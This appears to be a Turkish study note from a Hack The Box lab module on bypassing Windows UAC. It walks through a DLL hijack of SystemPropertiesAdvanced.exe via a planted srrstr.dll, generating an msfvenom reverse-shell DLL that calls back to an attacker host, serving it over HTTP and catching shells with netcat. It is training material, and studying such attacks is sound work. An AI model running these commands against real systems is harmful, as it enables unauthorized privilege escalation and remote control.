[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) yükseltilmiş eylemler için onay promptu etkinleştiren bir özelliktir. Uygulamaların farklı `bütünlük` seviyeleri vardır ve yüksek seviyeli bir program sistemi tehlikeye atabilecek görevler gerçekleştirebilir. UAC etkinleştirildiğinde, bir yönetici bu uygulamaların/görevlerin çalışması için sisteme yönetici düzeyinde erişim yetkisi vermediği sürece, uygulamalar ve görevler her zaman yönetici olmayan bir hesabın güvenlik bağlamı altında çalışır. Adminleri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.

UAC uygulandığında, bir kullanıcı standart kullanıcı hesabıyla sisteminde oturum açabilir. Prosesler standart bir kullanıcı tokenı kullanılarak başlatıldığında, standart bir kullanıcıya verilen hakları kullanarak görevleri yerine getirebilirler. Bazı uygulamaların çalışması için ek izinler gerekir ve UAC bunların düzgün çalışması için token'a ek erişim hakları sağlayabilir.

Bu [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığını derinlemesine ele alır ve oturum açma prosesi, kullanıcı deneyimi ve UAC mimarisini içerir. Yöneticiler, UAC'nin lokal düzeyde (secpol.msc kullanarak) kuruluşlarına özel olarak nasıl çalışacağını yapılandırmak için güvenlik ilkelerini kullanabilir veya bir Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırılabilir ve dışarı aktarılabilir. Çeşitli ayarlar [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). ayrıntılı olarak ele alınmaktadır . UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tabloda ek ayrıntılar verilmektedir:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                              | Registry Key                | Default Setting                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Built-in Administrator hesabı için Admin Onay Modu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemesine izin verme](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Admin Approval Mode'da yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                             | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                 | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Uygulama kurulumlarını tespit edin ve yükseltme isteyin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                            | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Yalnızca imzalanmış ve doğrulanmış yürütülebilir dosyaları yükseltin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                  | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Yalnızca güvenli konumlarda kurulu olan UIAccess uygulamalarını yükseltin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                          | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Tüm administrators'ı Admin Approval Mode'da çalıştırın](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                         | EnableLUA                   | Enabled                                                      |
| [User Account Control: Yükseltme istendiğinde güvenli masaüstüne geçme](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                    | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Dosya ve registry yazma hatalarını kullanıcı başına konumlara sanallaştırın](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                | EnableVirtualization        | Enabled                                                      |

[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)

![Pasted image 20241115214338.png](/img/user/resimler/Pasted%20image%2020241115214338.png)

UAC etkinleştirilmelidir ve bir saldırganın ayrıcalık kazanmasını engellemese de, bu prosesi yavaşlatabilecek ve onları daha gürültülü olmaya zorlayabilecek ekstra bir adımdır.

`Varsayılan RID 500 administrator` hesabı her zaman yüksek zorunlu düzeyde çalışır. Yönetici Onay Modu (AAM) etkinleştirildiğinde, oluşturduğumuz tüm yeni yönetici hesapları varsayılan olarak orta zorunlu düzeyde çalışacak ve oturum açtıklarında iki ayrı access token atanacaktır. Aşağıdaki örnekte, `sarah` kullanıcı hesabı administrators grubundadır, ancak cmd.exe şu anda ayrıcalıksız access token bağlamında çalışmaktadır.

#### **Geçerli Kullanıcıyı Kontrol Etme**

```cmd-session
C:\htb> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

#### **Admin Grup Üyeliğini Onaylama**

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```


#### **Kullanıcı Ayrıcalıklarının Gözden Geçirilmesi**

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

#### **UAC'nin Etkinleştirildiğini Onaylama**  

GUI onay promp'unun komut satırı sürümü yoktur, bu nedenle ayrıcalıklı access token'ımızla komutları çalıştırmak için UAC'yi atlamamız gerekecektir. İlk olarak, UAC'nin etkin olup olmadığını ve etkinse hangi düzeyde olduğunu doğrulayalım.

```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

#### **UAC Düzeyini Denetleme**

```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

`ConsentPromptBehaviorAdmin` değeri `0x5`'tir, bu da en yüksek UAC seviyesi olan `Always notify (Her zaman bildir)` 'ın etkin olduğu anlamına gelir. Bu en yüksek seviyede daha az UAC atlaması vardır.


#### **Windows Sürümünü Kontrol Etme**  

UAC, farklı Windows yapılarındaki kusurlardan veya istenmeyen işlevselliklerden yararlanır. Yükseltmek istediğimiz Windows yapısını inceleyelim.

```powershell-session
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Bu, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak Windows sürüm `1607`'ye çapraz referans verdiğimiz 14393 derleme sürümünü döndürür.

![Pasted image 20241115220625.png](/img/user/resimler/Pasted%20image%2020241115220625.png)

UACME projesi, etkilenen Windows yapı numarası, kullanılan teknik ve Microsoft'un bunu düzeltmek için bir güvenlik güncelleştirmesi yayınlayıp yayınlamadığına ilişkin bilgiler de dahil olmak üzere UAC baypaslarının bir listesini tutar. Windows 10 yapı 14393'ten itibaren çalıştığı belirtilen 54 numaralı tekniği kullanalım. Bu teknik, otomatik yükselen binary `SystemPropertiesAdvanced.exe`'nin 32 bit sürümünü hedefler. Windows'un UAC onay istemine prompt'a ihtiyaç duymadan otomatik olarak yükselmesine izin vereceği birçok güvenilir binary vardır.

Bu [blog](https://egre55.github.io/system-properties-uac-bypass) gönderisine göre, `SystemPropertiesAdvanced.exe` ' nin 32 bit sürümü, System Restore fonksiyonu tarafından kullanılan ve var olmayan DLL srrstr.dll dosyasını yüklemeye çalışmaktadır.

Bir DLL'yi bulmaya çalışırken, Windows aşağıdaki arama sırasını kullanacaktır.

1. Uygulamanın yüklendiği dizin.  
    
2. 64-bit sistemler için `C:\Windows\System32` sistem dizini.  
    
3. 16 bit sistem dizini `C:\Windows\System` (64 bit sistemlerde desteklenmez)  
    
4. Windows dizini.  
    
5. PATH ortam değişkeninde listelenen tüm dizinler.


#### **Path Variable'ın Gözden Geçirilmesi**  

`cmd /c echo %PATH%` komutunu kullanarak yol değişkenini inceleyelim. Bu aşağıdaki varsayılan klasörleri ortaya çıkarır. `WindowsApps` klasörü kullanıcının profilindedir ve kullanıcı tarafından yazılabilir.

```powershell-session
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

Yükseltilmiş bir bağlamda yüklenecek olan `WindowsApps` klasörüne kötü amaçlı bir `srrstr.dll` DLL'si yerleştirerek DLL hijacking kullanarak UAC'yi potansiyel olarak atlayabiliriz.


#### **Kötü Amaçlı srrstr.dll DLL Oluşturma**  

İlk olarak, bir reverse shell çalıştırmak için bir DLL oluşturalım.

```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```


#### **Saldırı Host'unda Python HTTP Sunucusunu Başlatma**  

Oluşturulan DLL'yi bir klasöre kopyalayın ve barındırmak için bir Python mini web sunucusu kurun.

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m http.server 8080
```


#### **DLL Hedefini İndirme**  

Kötü amaçlı DLL'yi hedef sisteme indirin ve saldırı makinemizde bir `Netcat` dinleyicisi kurun.

#### Starting nc Listener on Attack Host

```shell-session
M1R4CKCK@htb[/htb]$ nc -lvnp 8443
```

#### **Test Bağlantısı**  

Kötü amaçlı `srrstr.dll` dosyasını çalıştırırsak, normal kullanıcı haklarını (UAC etkin) gösteren bir shell geri alırız. Bunu test etmek için DLL'yi `rundll32.exe` kullanarak çalıştırabilir ve bir reverse shell bağlantısı elde edebiliriz.

```cmd-session
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Tekrar bağlantı kurduğumuzda, normal kullanıcı haklarını göreceğiz.

```shell-session
M1R4CKCK@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Users\sarah> whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```


#### **Hedef Hostta SystemPropertiesAdvanced.exe Çalıştırılıyor**  

Şimdi, `SystemPropertiesAdvanced.exe '` nin 32 bit sürümünü hedef hosttan çalıştırabiliriz.

```cmd-session
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

#### **Bağlantının Geri Alınması**  

Dinleyicimizi tekrar kontrol ettiğimizde, neredeyse anında bir bağlantı almamız gerekir.

```shell-session
M1R4CKCK@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32>whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

Bu başarılı olur ve ayrıcalıklarımızın mevcut olduğunu ve gerekirse etkinleştirilebileceğini gösteren yükseltilmiş bir shell alırız.


Soru : Normal kullanıcı ayrıcalıklarına sahip bir reverse shell bağlantısı ve UAC'yi atlayan başka bir bağlantı elde etmek için bu bölümdeki adımları izleyin. İşiniz bittiğinde flag.txt dosyasının içeriğini sarah kullanıcısının Masaüstüne gönderin.
Cevap : 

